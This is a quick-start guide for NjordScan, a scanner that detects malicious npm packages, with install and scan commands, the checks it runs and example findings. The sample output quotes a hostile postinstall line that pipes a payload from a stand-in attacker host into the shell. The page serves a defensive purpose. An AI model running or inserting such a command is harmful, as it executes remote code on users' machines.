# NPM Threat Detection - Quick Start

> Get started with NjordScan's npm package threat detection

## What You'll Learn

- How NjordScan detects malicious npm packages
- How to scan for supply chain threats
- How to interpret results

## Quick Start

### 1. Install

```bash
python3 -m venv venv && source venv/bin/activate
pip install -e .
python -m njordscan update
python -m njordscan legal --accept
```

### 2. Scan Your Project

```bash
# Standard scan — includes supply chain and dependency checks
python -m njordscan scan .

# Deep scan with enhanced analysis
python -m njordscan scan . --mode deep
```

### 3. What Gets Checked

NjordScan automatically checks:

**Supply Chain Module (static scan):**
- `package.json` lifecycle scripts (`postinstall`, `preinstall`, etc.) for dangerous commands
- `package-lock.json` / `yarn.lock` for missing integrity hashes
- Lockfile entries from non-standard registries (dependency confusion)
- Git URL dependencies that bypass registry checks

**Dependencies Module (static scan):**
- Known malicious packages (event-stream, flatmap-stream, etc.)
- Typosquatted package names
- Outdated packages with known vulnerabilities
- npm audit integration (when npm is available)

**Heuristic Analysis (when --ai-enhanced is used):**
- Code obfuscation patterns (eval, String.fromCharCode, base64)
- Data exfiltration indicators (cookie harvesting, environment variable access)
- Crypto wallet targeting (window.ethereum, private key extraction)
- Maintainer metadata anomalies

### 4. Example Output

```
SUPPLY_CHAIN MODULE
  CRITICAL  Dangerous install script: postinstall
            Lifecycle script 'postinstall' contains a dangerous pattern:
            Pipes remote content into shell.
            Command: curl https://evil.com/payload.sh | sh

  HIGH      Non-standard registry: evil-pkg
            Package 'evil-pkg' resolves from a non-standard registry.

  MEDIUM    Lockfile missing integrity hashes (3 packages)
            3 packages in package-lock.json are missing integrity checksums.
```

## How It Works

All detection is **heuristic/rule-based** (not ML):

| Check | Technique |
|-------|-----------|
| Malicious install scripts | Regex patterns for dangerous shell commands |
| Lockfile integrity | JSON parsing + registry URL validation |
| Typosquatting | `difflib.SequenceMatcher` string similarity |
| Obfuscation | Regex pattern counts + scoring |
| Data exfiltration | Pattern matching for data collection + network calls |

## Further Reading

- [NPM Threat Detection (full doc)](../ai-npm-detection.md)
- [Vulnerability Types](../security/vulnerability-types.md)
- [CLI Reference](../user-guide/cli-reference.md)
